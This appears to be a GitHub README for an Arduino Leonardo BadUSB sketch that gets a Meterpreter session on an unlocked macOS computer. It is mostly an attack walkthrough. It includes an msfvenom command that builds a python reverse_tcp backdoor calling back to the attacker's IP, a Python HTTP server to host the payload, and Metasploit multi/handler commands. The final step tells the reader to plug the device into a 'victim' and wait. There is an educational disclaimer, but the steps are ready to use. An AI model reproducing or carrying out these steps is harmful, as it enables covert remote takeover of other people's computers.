# Description
A simple sketch for handle MacOS meterpreter session using an Arduino Leonardo (atmega32u4)
# Disclaimer
This sketch was created only for educational purposes. This script shows the danger of leaving your computer unlocked. The author respects the rights and freedom of each person and is not responsible for your actions.
# Demonstration
MacOS desktop:
![](https://github.com/cucurucuq/arduino_leonardo_macos_meterpreter/blob/main/badusb_macos.gif)
Kali:
![](https://github.com/cucurucuq/arduino_leonardo_macos_meterpreter/blob/main/capture_session.gif)
# Usage 
We need to use Metasploit Framework and simple http server, you can use Kali Linux

1. Generate a backdoor file
```
$ msfvenom payload python/meterpreter/reverse_tcp LHOST=attacker's IP LPORT=8080 > /var/www/html/path/to/file
```
2. Run simple HTTP server 
```
$ cd /var/www/html/
$ python3 -m http.server 8081
```
3. Open Metasploit and start multi-handler
```
$ use exploit/multi/handler
$ set payload python/meterpreter/reverse_tcp
$ set LHOST attacker's IP
$ set LPORT 8080
$ run
```
4. Download .ino file and Arduino IDE
5. Update attacker's IP, host, port and path to backdoor file using Arduino IDE
6. Upload this sketch to your Arduino Leonardo using Arduino IDE
7. Put your BadUSB to victim and wait a capture of meterpreter session!
